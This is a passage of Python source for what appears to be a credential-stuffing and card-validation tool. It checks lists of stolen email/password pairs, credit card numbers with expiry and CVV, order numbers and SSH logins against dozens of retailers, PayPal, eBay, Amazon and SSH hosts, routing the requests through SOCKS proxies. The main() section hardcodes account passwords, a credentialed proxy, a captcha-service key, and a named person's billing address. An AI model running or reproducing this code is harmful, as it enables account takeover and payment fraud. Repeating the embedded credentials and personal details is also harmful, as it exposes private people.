            status_check = check_process.bot(list_email_check,link_refer=extraoption,sock=sock)
            return status_check
        elif check_site.find('Register Paypal') != -1:
            # import int for register
            list_email_check = self.creat_register_info()
            ### regisger
            # self.update_status('Trying Register Paypal:' + list_email_check)
            regform = self.regAtLink('https://www.paypal.com/vn/cgi-bin/webscr?cmd=_registration-run&from=PayPal',
                                     list_info=list_email_check, sock=sock)
            if regform.find('socks die:') != -1:
                print('socks die:' + list_email_check)
                return 'socks die:' + list_email_check
            elif regform:
                return regform
        elif list_email_check.find('|') != -1:
            list_email = list_email_check.split('|')
            if check_site.find('Macys Status') != -1:
                ordernumber = list_email[0].strip()
                billemail = list_email[1].strip()
                if len(ordernumber.replace('-', '')) == 10 and ordernumber.replace('-', '').isdigit():
                    kohls_process = macys.Macys()
                    status_check = kohls_process.check_order_status(ordernumber,billemail,sock, sock_type, username='',
                                                                    password='')
                    if status_check:
                        print(status_check + list_email_check)
                        if status_check.find('socks die:') != -1:
                            print('socks die:' + list_email_check)
                            return 'socks die:' + list_email_check
                        else:
                            return status_check + list_email_check
                    else:
                        return 'check die: not valid'
            elif check_site.find('Kohls Status') != -1:
                ordernumber = list_email[1].strip()
                billemail = list_email[3].strip()
                password = list_email[4].strip()
                if 8 < len(ordernumber) < 11 and ordernumber.isdigit():
                    kohls_process = kohls.Kohls()
                    status_check = kohls_process.check_order_status(ordernumber, sock, sock_type, username='',
                                                                    password='')
                    if status_check:
                        print(status_check + list_email_check)
                        if status_check.find('socks die:') != -1:
                            print('socks die:' + list_email_check)
                            return 'socks die:' + list_email_check
                        else:
                            return status_check + list_email_check
                    else:
                        return 'check die: not valid'
            else:
                list_email_check = list_email_check.replace("/", "|")
                list_email = list_email_check.split('|')
                alphabet = '0123456789012345678901234567890123456789'
                min = 4
                max = 4
                stringimg = ''
                for x in random.sample(alphabet, random.randint(min, max)):
                    stringimg += x
                ccv_random = stringimg
                i = 0
                while i < len(list_email):
                    line_email = list_email[i].strip()
                    line_email = line_email.replace('\\', '|').replace("/", "|").replace(' ', "").replace('-', "")
                    if check_site.find('CCN Gate') != -1:
                        if 14 < len(line_email) <= 16 and line_email.strip().isdigit():
                            cardNumber = line_email.strip()
                            testthang = list_email[i + 1].strip()
                            if not testthang.isdigit():
                                expMonth = list_email[i + 2].strip()
                                if len(expMonth) == 4:
                                    thang1 = expMonth[:2]
                                    so = thang1[:1]
                                    expYear = expMonth[2:]
                                    if i + 3 > len(list_email) - 1:
                                        ccv = ccv_random
                                    else:
                                        ccv = list_email[i + 3].strip()
                                if len(expMonth) == 2:
                                    thang1 = expMonth
                                    so = thang1[:1]
                                    expYear = list_email[i + 3].strip()
                                    if i + 4 > len(list_email) - 1:
                                        ccv = ccv_random
                                    else:
                                        ccv = list_email[i + 4].strip()
                                if len(expMonth) == 1:
                                    thang1 = expMonth
                                    so = thang1
                                    expYear = list_email[i + 3].strip()
                                    if i + 4 > len(list_email) - 1:
                                        ccv = ccv_random
                                    else:
                                        ccv = list_email[i + 4].strip()
                                if len(expMonth) == 6:
                                    thang1 = expMonth[:2]
                                    so = thang1[:1]
                                    expYear = expMonth[2:]
                                    if i + 3 > len(list_email) - 1:
                                        ccv = ccv_random
                                    else:
                                        ccv = list_email[i + 3].strip()
                            else:
                                expMonth = testthang
                                if len(expMonth) == 4:
                                    thang1 = expMonth[:2]
                                    so = thang1[:1]
                                    expYear = expMonth[2:]
                                    if i + 2 > len(list_email) - 1:
                                        ccv = ccv_random
                                    else:
                                        ccv = list_email[i + 2].strip()
                                if len(expMonth) == 2:
                                    thang1 = expMonth
                                    so = thang1[:1]
                                    expYear = list_email[i + 2].strip()
                                    if i + 3 > len(list_email) - 1:
                                        ccv = ccv_random
                                    else:
                                        ccv = list_email[i + 3].strip()
                                if len(expMonth) == 1:
                                    thang1 = expMonth
                                    so = thang1
                                    expYear = list_email[i + 2].strip()
                                    if i + 3 > len(list_email) - 1:
                                        ccv = ccv_random
                                    else:
                                        ccv = list_email[i + 3].strip()
                                if len(expMonth) == 6:
                                    thang1 = expMonth[:2]
                                    so = thang1[:1]
                                    expYear = expMonth[2:]
                                    if i + 2 > len(list_email) - 1:
                                        ccv = ccv_random
                                    else:
                                        ccv = list_email[i + 2].strip()
                            if len(expYear) == 2:
                                nam = "20" + expYear
                            else:
                                nam = expYear
                            try:
                                d = int(nam)
                                hoho = int(thang1)
                            except ValueError:
                                pass
                            else:
                                if so == "0":
                                    thang12 = thang1[1:2]
                                else:
                                    thang12 = thang1
                                dien = int(thang12)
                                if dien <= 12:
                                    if 2 < len(ccv) < 5:
                                        try:
                                            b = int(ccv)
                                        except ValueError:
                                            ccv = ccv_random
                                    else:
                                        ccv = ccv_random
                                    thang123 = thang12
                                    if len(thang12) == 1:
                                        thang = "0" + thang12
                                    else:
                                        thang = thang12
                                    now = datetime.datetime.now()
                                    while d <= now.year:
                                        if d == now.year and int(thang) >= now.month:
                                            break
                                        d += 3
                                    nam = str(d)
                                    if d >= 2018:
                                        if len(nam) == 4:
                                            nam1 = nam[2:]
                                        thangnam = thang + nam1
                                        # status_check = None
                                        if check_site.find('CCN Gate 1') != -1:
                                            check_process = bigfishgame.Bigfishgames()
                                            status_check = check_process.check(ccnumber=cardNumber, ccmonth=thang,
                                                                               ccyear=nam, cvv=ccv, sock=sock,
                                                                               sock_type=sock_type,email='ruandejun01',password='hanoi123')
                                            if status_check:
                                                if status_check.find('socks die') != -1:
                                                    return 'socks die:' + list_email_check
                                                elif status_check.find('check die') != -1:
                                                    return status_check
                                                elif status_check.find('dont support') != -1:
                                                    return list_email_check + '|dont support'
                                                elif check_site.find('Email') != -1 or check_site.find('CCN Gate') != -1:
                                                    return list_email_check
                                                else:
                                                    return list_email_check + '|dont support'
                                        else:
                                            return list_email_check + '|dont support'
                                        break

                    elif re.search('.+?@.+?\..+?', line_email):
                        email = line_email.strip()
                        username = re.search('(.+?)@', line_email).group(1)
                        password = list_email[i + 1].strip()
                        # print(username
                        # print(password
                        sockdie = ''
                        status_check=None
                        if check_site=='Ebay':
                            check_process = ebay.Ebay()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Ebay change password') != -1:
                            print('Ebay change password')
                            check_process = ebay.Ebay()
                            status_check = check_process.change_password(email, password, username, sock)
                        elif check_site.find('Hotmail not exist') != -1:
                            print('==check Hotmail not exists==')
                            check_process = hotmail.Hotmail()
                            status_check = check_process.check_exist(email, sock, sock_type)
                        elif check_site.find('Ebay exist') != -1:
                            print('==check Ebay exist==')
                            check_process = ebay.Ebay()
                            status_check = check_process.check_exist(email, sock, sock_type)
                        elif check_site.find('Amazon exist') != -1:
                            print('==check Amazon exist==')
                            check_process = amazon.Amazon()
                            status_check = check_process.check_exist(email, sock, sock_type)
                        elif check_site.find('Beallsflorida') != -1:
                            print('check Beallsflorida')
                            check_process = beallsflorida.Beallsflorida()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Kohls') != -1:
                            print('check Kohls')
                            check_process = kohls.Kohls()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Quill') != -1:
                            print('check Quill')
                            check_process = quill.Quill()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Jet') != -1:
                            print('check Jet')
                            check_process = jet.Jet()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Neimanmarcus') != -1:
                            print('check neimanmarcus')
                            check_process = neimanmarcus.Neimanmarcus()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Choxi') != -1:
                            print('check Choxi')
                            check_process = choxi.Choxi()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Zappos') != -1:
                            print('check zappos')
                            check_process = checkzappos.Checkzappos()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Lowes') != -1:
                            print('check Lowes')
                            check_process = checklowes.Checklowes()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Bloomingdales') != -1:
                            print('check_bloomingdales')
                            check_process = bloomingdales.Bloomingdales()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('paypal balance') != -1:
                            print('check paypal balance')
                            check_process = paypal.Paypal()
                            status_check = check_process.check_balance(email, password, sock, sock_type)
                        elif check_site.find('Samsclub') != -1:
                            print('check Samsclub')
                            check_process = samsclub.Samsclub()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Macys') != -1:
                            print('check macys')
                            check_process = macys.Macys()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Walmart') != -1:
                            print('check Walmart')
                            check_process = checkwalmart.Checkwalmart()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Homedepot') != -1:
                            print('check Homedepot')
                            check_process = checkhomedepot.Checkhomedepot()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Chefcatalog') != -1:
                            print('check Chefcatalog')
                            check_process = checkchefcatalog.Checkchefcatalog()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Bedbathandbeyond') != -1:
                            print('check Bedbathandbeyond')
                            check_process = checkbedbathandbeyond.Checkbedbathandbeyond()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Costco') != -1:
                            print('check Costco')
                            check_process = checkcostco.Checkcostco()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Gap') != -1:
                            print('check Gap')
                            check_process = checkgap.Checkgap()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Overstock') != -1:
                            print('check Overstock')
                            check_process = checkoverstock.Checkoverstock()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Wayfair') != -1:
                            print('check Wayfair')
                            check_process = checkwayfair.Checkwayfair()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Mrporter') != -1:
                            print('check Mrporter')
                            check_process = mrporter.Mrporter()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Belk') != -1:
                            print('check Belk')
                            check_process = belk.Belk()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('1800petmeds') != -1:
                            print('check 1800petmeds')
                            check_process = petmeds.Petmeds()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Michaelkors') != -1:
                            print('check Michaelkors')
                            check_process = michaelkors.Michaelkors()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Moosejaw') != -1:
                            print('check Moosejaw')
                            check_process = moosejaw.Moosejaw()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Hhgregg') != -1:
                            print('check Hhgregg')
                            check_process = hhgregg.Hhgregg()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Abt') != -1:
                            print('check Abt')
                            check_process = abt.Abt()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Shoprunner') != -1:
                            print('check Shoprunner')
                            check_process = shoprunner.Shoprunner()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Williamssonoma') != -1:
                            print('check Williamssonoma')
                            check_process = checkwilliamssonoma.Checkwilliamssonoma()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Jcpenney') != -1:
                            print('check jcpenney')
                            check_process = checkjcpenney.Checjcpenney()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        # elif check_site.find('Twitter') != -1:
                        #     print(extraoption
                        #     check_process = twitter.Twitter()
                        #     status_check = check_process.check(email, password, username, sock, sock_type,extraoption)
                        elif check_site.find('Bestbuy') != -1:
                            print('check bestbuy')
                            check_process = checkbestbuy.Checbestbuy()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Bodybuilding') != -1:
                            print('check Bodybuilding')
                            check_process = bodybuilding.Bodybuilding()
                            status_check = check_process.check(email, password, username, sock, sock_type)
                        elif check_site.find('Nordstrom') != -1:
                            print('check Nordstrom')
                            check_process = nordstrom.Nordstrom()
                            status_check = check_process.check(email, password, username, sock, sock_type)

                        elif check_site.find('Email') != -1:
                            status_check = self.check_email_valid(email, username, password, sock, sock_type)

                        if status_check:
                            if status_check.find('socks die') != -1 or status_check.find('sock die') != -1:
                                print('socks die:' + list_email_check)
                                return 'socks die:' + list_email_check
                            elif check_site.find('Email') != -1 or check_site.find('Creditcard') != -1:
                                return list_email_check
                            else:
                                print('==valid==',status_check)
                                if checkAmazon:
                                    print('==checkAmazon==')
                                    check_process = amazon.Amazon()
                                    status_check = check_process.check_exist(email, sock, sock_type)
                                elif checkEbay:
                                    print('==checkEbay===')
                                    check_process = ebay.Ebay()
                                    status_check = check_process.check_exist(email, sock, sock_type)
                                return status_check
                        else:
                            return 'check die: not valid'
                    elif check_site.find('SSH') != -1 and re.search('(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line_email):
                        # self.mail_dup[ip_re.group(1).strip()] = 1
                        self.email = line_email.strip()
                        self.username = list_email[i+1].strip()
                        self.password = list_email[i+2].strip()
                        check_process = checkssh.Checkssh()
                        status_check = check_process.check(self.email, username=self.username, password=self.password,checkport=True)
                        if status_check:
                            if status_check.find('socks die') != -1 or status_check.find('sock die') != -1:
                                print('socks die:' + list_email_check)
                                return 'socks die:' + list_email_check
                            elif check_site.find('Email') != -1 or check_site.find('Creditcard') != -1:
                                return list_email_check
                            else:
                                return status_check
                        else:
                            return 'check die: not valid'
                    i += 1



def input(ff):
    if ff.captchaImage:
        webbrowser.open(ff.captchaImage);
        ff.captchaResult = raw_input("Captcha Result:");
    if ff.questionString:
        print("#" * 30)
        print(ff.questionString)
        print("-" * 30)
        ff.questionResult = raw_input("Question Result:");


def main():
    ordervr = Emailcheck(
        header='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.111',
        appFolderPath='D:/Dropbox/TVA-Ruandejun/forum_automator')
    # conn = gmail.Gmail('quanlyebay@gmail.com', 'hanoi123')
    # msgs = conn.search.unread().all()
    # msgs['gmail.Message object at 0x01C45910']
    registerForm = []
    #ordervr.check_bloomingdales_status('451975277','vbshPXaqDBFOc@earthlink.net','','')
    #lewellen52@comcast.net|1919maxwell
    # test = ordervr.check_email('dinhngockhuong@gmail.com|hanoi123', registerForm, check_site='Twitter',
    #                            sock_type='socks', sock='127.0.0.1:1080',
    #                            list_bill='Giselle|Cubillos|5626 Rockbridge Court||Columbia|MD|21045|')
    #link,ff,br, = registerForm.pop(0)
    #ff.keyantigate='83172678a503e45ac2da7e67428f49bb'
    #input(ff);
    #ordervr.submitFinalForm(ff,br);
    # print(test
    test = ordervr.check_email('dinhngockhuong@gmail.com|Hanoi123!@#',check_site='Belk',sock='bietdeobao_wXcTg:nLyIdPKHeI_country-us@185.193.157.60:12325')
    print(test)
if __name__ == "__main__":
    sys.exit(main())